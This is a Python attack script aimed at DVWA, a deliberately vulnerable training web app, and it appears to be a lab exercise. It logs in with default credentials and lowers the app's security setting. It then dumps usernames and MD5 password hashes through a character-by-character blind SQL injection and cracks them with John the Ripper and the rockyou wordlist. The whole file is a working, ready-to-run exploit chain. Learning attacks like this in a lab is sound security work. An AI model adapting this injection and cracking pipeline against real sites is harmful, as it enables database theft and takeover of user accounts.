import argparse, requests, sys, subprocess
from bs4 import BeautifulSoup

def login(args):
    s = requests.Session()
    res = s.get(f"{args.url}/login.php", proxies={'http':f'http://{args.burp}'})
    soup = BeautifulSoup(res.text, 'html.parser')
    input_list = soup.findAll('input')
    for tag in input_list:
        if tag['name'] == "user_token":
            print(f"[+] CSRF Token: {tag['value']}")
            user_token =  tag['value']
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    data = {
        'username':'admin',
        'password':'password',
        'Login':'Login',
        'user_token':user_token
    }
    s.post(f"{args.url}/login.php", headers=headers, data=data, proxies={'http':f'http://{args.burp}'})
    res = s.get(f"{args.url}/vulnerabilities/sqli_blind/", proxies={'http':f'http://{args.burp}'})
    if "Vulnerability: SQL Injection (Blind)" in res.text:
        print("[+] Login Successful!")
        return s
    else:
        print("[!] Login Failed!  Exiting...")
        sys.exit(2)

def lower_security(args, s):
    res = s.get(f"{args.url}/security.php", proxies={'http':f'http://{args.burp}'})
    soup = BeautifulSoup(res.text, 'html.parser')
    input_list = soup.findAll('input')
    for tag in input_list:
        if tag['name'] == "user_token":
            print(f"[+] CSRF Token: {tag['value']}")
            user_token =  tag['value']
        headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    data = {
        'security':'low',
        'seclev_submit':'Submit',
        'user_token':user_token
    }
    s.post(f"{args.url}/security.php", headers=headers, data=data, proxies={'http':f'http://{args.burp}'})
    res = s.get(f"{args.url}/security.php", proxies={'http':f'http://{args.burp}'})
    if "<em>low</em>" in res.text:
        print("[+] Security Level Set to Low!")
        return s
    else:
        print("[!] Unable to Set Security Level to Low!  Exiting...")
        sys.exit(2)

def mysql_blind_sqli_data_exfiltration(s, url, inj_str):
    data = ""
    for i in range(1, 1000):
        try:
            exfiltrated_char = chr(find_char(s, url, inj_str.replace("[CHAR_NUM]", str(i))))
            data += exfiltrated_char
            sys.stdout.write(exfiltrated_char)
            sys.stdout.flush()
        except Exception as e:
            # print(f"[!] EXCEPTION: {e}")
            break
    return data

def find_char(s, url, inj_str):
    for j in range(32, 126):
            modified_inj_str = inj_str.replace("[CHAR]", str(j))
            target = f"{url}/vulnerabilities/sqli_blind/?id={modified_inj_str}&Submit=Submit"
            r = s.get(target, proxies={'http':'http://127.0.0.1:8080'})
            if "User ID exists in the database." in r.text:
                return j
    return None

def build_john_file(args, user_dict):
    f = open("/tmp/users.txt", 'w')
    for key, value in user_dict.items():
        f.write(f"{key}:{value}\n")
    f.close()

def find_rockyou():
    rockyou_check = subprocess.run(["ls /usr/share/wordlists/"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    if "rockyou.txt.gz" in rockyou_check.stdout:
        print("[-] Unzipping rockyou.txt...")
        subprocess.run(["sudo gunzip /usr/share/wordlists/rockyou.txt.gz"], shell=True)
    if "rockyou.txt" not in rockyou_check.stdout:
        print("[!] Wordlist rockyou.txt not found at /usr/share/wordlists/!  Please add the wordlist and try again...")
        sys.exit(2)

def john_the_ripper():
    subprocess.run(["john --format=raw-md5 --wordlist /usr/share/wordlists/rockyou.txt /tmp/users.txt"], shell=True)
    results = subprocess.run(["john --show --format=Raw-MD5 /tmp/users.txt"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    print(results.stdout)

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', help='URL of DVWA', required=True)
    parser.add_argument('-b','--burp', help='IP:Port of Burp Proxy', required=True)
    return parser.parse_args()

def main(args):
    print("[-] Logging in...")
    s = login(args)
    print(f"[+] Session ID: {s.cookies['PHPSESSID']}\n[+] Security Level: {s.cookies['security']}")
    if s.cookies['security'] == "impossible":
        print("[-] Lowering Security Level for Demo...")
        lower_security(args, s)
    print("[-] Starting Blind SQL Injection Exploit...")
    user_dict = {}
    for i in range(1, 6):
        if i > 1:
            print(f"\n[-] Pulling User {i}...")
        else:
            print(f"[-] Pulling User {i}...")
        print("[+] Username: ")
        username = mysql_blind_sqli_data_exfiltration(s, args.url, f"1'+and+ascii(substring((select+user+from+users+where+user_id={i}+limit+1),[CHAR_NUM],1))=[CHAR]--+")
        print("\n[+] Password (MD5): ")
        password = mysql_blind_sqli_data_exfiltration(s, args.url, f"1'+and+ascii(substring((select+password+from+users+where+user_id={i}+limit+1),[CHAR_NUM],1))=[CHAR]--+")
        user_dict[username] = password
    print("\n")
    print(user_dict)
    find_rockyou()
    build_john_file(args, user_dict)
    john_the_ripper()
    print("[+] Done!")

if __name__ == "__main__":
    args = arg_parse()
    main(args)